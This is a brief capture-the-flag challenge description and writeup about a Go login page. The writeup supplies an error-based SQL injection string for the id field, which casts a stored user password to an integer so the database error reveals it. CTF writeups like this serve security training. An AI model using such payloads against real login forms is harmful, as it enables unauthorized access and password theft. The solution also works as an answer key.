## Deskripsi

I copy pasted this Go tutorial from the internet and I successfully made the login page, I copied this from the internet so it must be completely secure.... right? You can try logging in using id `test` and password `test`

## Writeup

Insert in the id field `' and 1=cast((SELECT password FROM users LIMIT 1 OFFSET 1) as int) and '1'='1`

You will get an error showing the flag
